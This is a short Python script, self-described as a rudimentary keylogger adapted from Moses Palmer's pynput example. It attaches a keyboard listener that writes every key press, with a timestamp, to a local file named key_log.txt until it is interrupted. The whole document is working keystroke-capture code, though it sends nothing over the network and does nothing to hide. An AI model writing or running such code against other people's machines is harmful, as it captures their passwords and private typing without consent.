'''
    Rudimentary keylogger based on Moses Palmer's code and plugin.  Made adjustments for the Py3.6.
'''

from pynput.keyboard import Key, Listener
import logging

log_dir = ""

logging.basicConfig(filename=(log_dir + 'key_log.txt'), level=logging.DEBUG, format='%(asctime)s %(message)s', datefmt='%m/%d/%Y %I:%M:%S %p')
try:
    def on_press(key):
        logging.info(str(key))

    with Listener(on_press=on_press) as listener:
        listener.join()
except KeyboardInterrupt:
    exit()
